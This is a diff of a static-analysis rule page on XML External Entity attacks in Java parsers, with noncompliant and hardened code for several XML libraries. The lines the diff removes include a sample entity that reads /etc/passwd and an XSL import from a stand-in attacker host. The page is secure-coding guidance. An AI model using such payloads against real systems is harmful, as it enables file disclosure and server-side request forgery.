@@ -1,204 +1,93 @@
-<p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a
-href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system /
-network access …​) which could lead to vulnerabilities such as confidential file disclosures or <a
-href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>.</p>
-<p>Example in this XML document, an external entity read the /etc/passwd file:</p>
-<pre>
-&lt;?xml version="1.0" encoding="utf-8"?&gt;
-  &lt;!DOCTYPE test [
-    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-  ]&gt;
-&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
-  &lt;to&gt;&amp;xxe;&lt;/to&gt;
-  &lt;from&gt;Jani&lt;/from&gt;
-  &lt;heading&gt;Reminder&lt;/heading&gt;
-  &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
-&lt;/note&gt;
-</pre>
-<p>In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:</p>
-<pre>
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl"&gt;
-  &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
-  &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
- &lt;xsl:template match="/"&gt;
-  &amp;content;
- &lt;/xsl:template&gt;
-&lt;/xsl:stylesheet&gt;
-</pre>
-<p>It is recommended to disable access to external entities and network access in general.</p>
-<p>To protect Java XML Parsers from XXE attacks <a
-href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-94ABC0EE-9DC8-44F0-84AD-47ADD5340477">these
-properties</a> have been defined since JAXP 1.5:</p>
-<ul>
-  <li> ACCESS_EXTERNAL_DTD: should be set to "" when processing XML/XSD/XLS files (it looks for external DOCTYPEs) </li>
-  <li> ACCESS_EXTERNAL_SCHEMA: should be set to "" when processing XML/XSD/XLS files (it looks for external schemalocation ect) </li>
-  <li> ACCESS_EXTERNAL_STYLESHEET should be set to "" when processing XLS file (it looks for external imports, includes ect); </li>
-</ul>
-<p>Note that <a href="http://xerces.apache.org/xerces2-j/">Apache Xerces</a> is still based on JAXP 1.4, therefore one solution is to set to
-<code>false</code> the <a href="http://xerces.apache.org/xerces2-j/features.html#external-general-entities">external-general-entities</a> feature.</p>
-<p>Avoid FEATURE_SECURE_PROCESSING feature to protect from XXE attacks because depending on the implementation:</p>
-<ul>
-  <li> it has <a
-  href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-88B04BE2-35EF-4F61-B4FA-57A0E9102342">no effect</a> to protect the parser from XXE attacks but helps guard against excessive memory consumption from XML processing. </li>
-  <li> or it’s just an obscur shortcut (it could set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA to "" but without guarantee). </li>
-</ul>
-<p>When setting <a href="https://docs.oracle.com/javase/7/docs/api/org/xml/sax/XMLReader.html#setEntityResolver(org.xml.sax.EntityResolver)">an entity
-resolver</a> to <code>null</code> (eg: <code>setEntityResolver(null)</code>) the parser will use its own resolution, which is unsafe.</p>
 <h2>Noncompliant Code Example</h2>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilderFactory</a> library:</p>
+<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilder</a>, <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParser</a>, <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInput</a>, <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">Transformer</a> and <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">Schema</a> JAPX factories:</p>
 <pre>
-String xml = "xxe.xml";
-DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
-DocumentBuilder builder = df.newDocumentBuilder();  // Noncompliant
-Document document = builder.parse(new InputSource(xml));
-DOMSource domSource = new DOMSource(document);
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParserFactory</a> library:</p>
-<pre>
-String xml = "xxe.xml";
-SaxHandler handler = new SaxHandler();
-SAXParserFactory factory = SAXParserFactory.newInstance();
-SAXParser parser = factory.newSAXParser();  // Noncompliant
-parser.parse(xml, handler);
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInputFactory</a> library:</p>
-<pre>
-XMLInputFactory factory = XMLInputFactory.newInstance();  // Noncompliant
-XMLEventReader eventReader = factory.createXMLEventReader(new FileReader("xxe.xml"));
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">TransformerFactory</a> library:</p>
-<pre>
-String xslt = "xxe.xsl";
-String xml = "xxe.xml";
-TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();  // Noncompliant
-Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // Noncompliant
 
-StringWriter writer = new StringWriter();
-transformer.transform(new StreamSource(xml), new StreamResult(writer));
-String result = writer.toString();
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">SchemaFactory</a> library:</p>
-<pre>
-String xsd = "xxe.xsd";
-StreamSource xsdStreamSource = new StreamSource(xsd);
+SAXParserFactory factory = SAXParserFactory.newInstance(); // Noncompliant
 
-SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);  // Noncompliant
-Schema schema = schemaFactory.newSchema(xsdStreamSource);
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html">Validator</a> library:</p>
-<pre>
-String xsd = "xxe.xsd";
-String xml = "xxe.xml";
-StreamSource xsdStreamSource = new StreamSource(xsd);
-StreamSource xmlStreamSource = new StreamSource(xml);
+XMLInputFactory factory = XMLInputFactory.newInstance(); // Noncompliant
 
-SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
-Schema schema = schemaFactory.newSchema(xsdStreamSource);
-Validator validator = schema.newValidator();   // Noncompliant
+TransformerFactory factory = javax.xml.transform.TransformerFactory.newInstance();  // Noncompliant
 
-StringWriter writer = new StringWriter();
-validator.validate(xmlStreamSource, new StreamResult(writer));
+SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);  // Noncompliant
 </pre>
-<p><a href="https://dom4j.github.io/">Dom4j</a> library:</p>
+<p>For <a href="https://dom4j.github.io/">Dom4j</a> library:</p>
 <pre>
-SAXReader xmlReader = new SAXReader(); // Noncompliant by default
-Document xmlResponse = xmlReader.read(xml);
+SAXReader xmlReader = new SAXReader(); // Noncompliant
 </pre>
-<p><a href="http://www.jdom.org/">Jdom2</a> library:</p>
+<p>For <a href="http://www.jdom.org/">Jdom2</a> library:</p>
 <pre>
-SAXBuilder builder = new SAXBuilder(); // Noncompliant by default
-Document document = builder.build(new File(xml));
+SAXBuilder builder = new SAXBuilder(); // Noncompliant
 </pre>
 <h2>Compliant Solution</h2>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilderFactory</a> library:</p>
+<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html">DocumentBuilder</a>, <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParser</a>, <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInput</a>, <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">Transformer</a> and <a
+href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">Schema</a> JAPX factories:</p>
 <pre>
-String xml = "xxe.xml";
-DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
-df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
-df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
-DocumentBuilder builder = df.newDocumentBuilder();
-Document document = builder.parse(new InputSource(xml));
-DOMSource domSource = new DOMSource(document);
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html">SAXParserFactory</a> library:</p>
-<pre>
-String xml = "xxe.xml";
-SaxHandler handler = new SaxHandler();
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+// to be compliant, completely disable DOCTYPE declaration:
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+// or completely disable external entities declarations:
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+// or prohibit the use of all protocols by external entities:
+factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
+
+
 SAXParserFactory factory = SAXParserFactory.newInstance();
-SAXParser parser = factory.newSAXParser();
-parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
-parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
-parser.parse(xml, handler);
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/stream/XMLInputFactory.html">XMLInputFactory</a> library:</p>
-<pre>
+// to be compliant, completely disable DOCTYPE declaration:
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+// or completely disable external entities declarations:
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+// or prohibit the use of all protocols by external entities:
+SAXParser parser = factory.newSAXParser(); // Noncompliant
+parser.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+parser.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
+
 XMLInputFactory factory = XMLInputFactory.newInstance();
-factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
-factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");  // compliant
+// to be compliant, completely disable DOCTYPE declaration:
+factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
+// or completely disable external entities declarations:
+factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE);
+// or prohibit the use of all protocols by external entities:
+factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
 
-XMLEventReader eventReader = factory.createXMLEventReader(new FileReader("xxe.xml"));
+TransformerFactory factory = javax.xml.transform.TransformerFactory.newInstance();
+// to be compliant, prohibit the use of all protocols by external entities:
+factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
+
+SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
+// to be compliant, completely disable DOCTYPE declaration:
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+// or prohibit the use of all protocols by external entities:
+factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
 </pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/transform/TransformerFactory.html">TransformerFactory</a> library:</p>
-<pre>
-String xslt = "xxe.xsl";
-String xml = "xxe.xml";
-TransformerFactory transformerFactory = javax.xml.transform.TransformerFactory.newInstance();
-transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
-transformerFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, ""); // Compliant
-// ACCESS_EXTERNAL_SCHEMA not supported in several TransformerFactory implementations
-Transformer transformer = transformerFactory.newTransformer(new StreamSource(xslt));
-
-StringWriter writer = new StringWriter();
-transformer.transform(new StreamSource(xml), new StreamResult(writer));
-String result = writer.toString();
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html">SchemaFactory</a> library:</p>
-<pre>
-String xsd = "xxe.xsd";
-StreamSource xsdStreamSource = new StreamSource(xsd);
-
-SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
-schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // Compliant
-schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
-Schema schema = schemaFactory.newSchema(xsdStreamSource);
-</pre>
-<p><a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/Validator.html">Validator</a> library:</p>
-<pre>
-String xsd = "xxe.xsd";
-String xml = "xxe.xml";
-StreamSource xsdStreamSource = new StreamSource(xsd);
-StreamSource xmlStreamSource = new StreamSource(xml);
-
-SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
-Schema schema = schemaFactory.newSchema(xsdStreamSource);
-schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
-schemaFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
-// validators will also inherit of these properties
-Validator validator = schema.newValidator();
-
-validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");   // Compliant
-validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");   // Compliant
-
-StringWriter writer = new StringWriter();
-validator.validate(xmlStreamSource, new StreamResult(writer));
-</pre>
-<p>For <a href="https://dom4j.github.io/">dom4j</a> library, ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_SCHEMA are not supported, thus a very strict fix
-is to disable doctype declarations:</p>
+<p>For <a href="https://dom4j.github.io/">Dom4j</a> library:</p>
 <pre>
 SAXReader xmlReader = new SAXReader();
-xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // Compliant
-Document xmlResponse = xmlReader.read(xml);
+xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 </pre>
-<p><a href="http://www.jdom.org/">Jdom2</a> library:</p>
+<p>For <a href="http://www.jdom.org/">Jdom2</a> library:</p>
 <pre>
-SAXBuilder builder = new SAXBuilder(); // Compliant
-builder.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
-builder.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // Compliant
-Document document = builder.build(new File(xml));
+SAXBuilder builder = new SAXBuilder();
+builder.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+builder.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
 </pre>
 <h2>See</h2>
 <ul>
+  <li> <a
+  href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC">Oracle Java Documentation</a> - XML External Entity Injection Attack </li>
   <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)">OWASP Top 10 2017 Category A4</a> - XML External Entities
   (XXE) </li>
   <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java">OWASP XXE Prevention Cheat
